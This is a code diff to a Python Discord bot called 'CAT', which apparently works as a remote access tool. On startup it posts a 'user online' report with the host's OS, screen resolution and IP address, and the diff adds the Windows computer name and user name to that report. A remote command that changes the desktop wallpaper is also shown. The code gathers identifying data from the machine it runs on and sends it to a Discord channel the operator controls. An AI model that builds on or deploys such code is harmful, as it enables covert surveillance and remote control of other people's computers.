@@ -9,7 +9,7 @@ import os
 import subprocess
 import sys
 from datetime import datetime
-
+import win32api
 # Импорт библиотек
 import discord
 import pyautogui as pg
@@ -29,12 +29,16 @@ async def on_ready():
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
     x, y = pg.size()
-    embed = discord.Embed(title='**ПОЛЬЗОВАТЕЛЬ ОНЛАЙН**', description='CAT', color=0x03fcec, )
+    embed = discord.Embed(title='**ПОЛЬЗОВАТЕЛЬ ОНЛАЙН**', description='Configuration Administration Tool',
+                          color=0x03fcec, )
 
-    embed.add_field(name='**Время запука**', value=f'{date.hour}:{date.minute}', inline=False)
+    embed.add_field(name='**Время запуска**', value=f'{date.hour}:{date.minute}', inline=False)
     embed.add_field(name='**ОС**', value=f'{sys.platform}', inline=False)
     embed.add_field(name='**Разрешение экрана**', value=f'{x}x{y}', inline=False)
     embed.add_field(name='**IP адрес**', value=f'{nf.ip()}', inline=False)
+    embed.add_field(name='**Название копмьютера**', value=f'{win32api.GetComputerName()}', inline=False)
+    embed.add_field(name='**Имя пользователя**', value=f'{win32api.GetUserName()}', inline=True)
+
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
     embed.set_footer(text=f'Используйте /help для справки!',
                      icon_url='https://i.imgur.com/YbYKL0F.png')
@@ -207,6 +211,4 @@ async def wallpaper(ctx, url):
         await ctx.send('**CAT:** Обои успешно изменены!')
     else:
         await ctx.send('**CAT:** Ошибка!')
-
-    os.remove('wallpaper.png')
 bot.run(config.token)
